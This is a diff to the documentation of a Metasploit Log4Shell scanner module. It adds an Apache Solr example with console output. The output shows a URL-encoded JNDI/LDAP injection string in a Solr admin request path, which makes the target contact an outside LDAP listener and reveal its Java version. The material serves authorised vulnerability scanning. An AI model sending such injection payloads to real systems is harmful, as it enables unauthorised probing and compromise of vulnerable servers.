@@ -2,7 +2,7 @@
 This module will scan an HTTP end point for the Log4Shell vulnerability by injecting a format message that will
 trigger an LDAP connection to Metasploit. This module is a generic scanner and is only capable of identifying
 instances that are vulnerable via one of the pre-determined HTTP request injection points. These points include
-HTTP headers and the HTTP request path. Additinally URI paths for common, known-vulnerable applications are included
+HTTP headers and the HTTP request path. URI paths for common, known-vulnerable applications are included
 in the `data/exploits/CVE-2021-44228/http_uris.txt` data file.
 
 This module has been successfully tested with:
@@ -88,4 +88,19 @@ msf6 auxiliary(scanner/http/log4shell_scanner) > run
 [*] Auxiliary module execution completed
 msf6 auxiliary(scanner/http/log4shell_scanner) > 
 
+```
+
+### Apache Solr
+
+Apache Solr is trivially exploitable by a remote and unauthenticated attacker when in its default configuration:
+
+```
+msf6 > use auxiliary/scanner/http/log4shell_scanner
+msf6 auxiliary(scanner/http/log4shell_scanner) > run http://10.10.235.209:8983/ srvhost=10.9.4.245
+
+[*] Started service listener on 10.9.4.245:389
+[+] 10.10.235.209:8983    - Log4Shell found via /solr/admin/cores?action=CREATE&wt=json&name=%24%7bjndi%3aldap%3a/10.9.4.245%3a389/vslscuy7m6q9pgfc18h/%24%7bsys%3ajava.vendor%7d_%24%7bsys%3ajava.version%7d%7d (java: Oracle Corporation_1.8.0_181)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Sleeping 30 seconds for any last LDAP connections
+[*] Auxiliary module execution completed
 ```
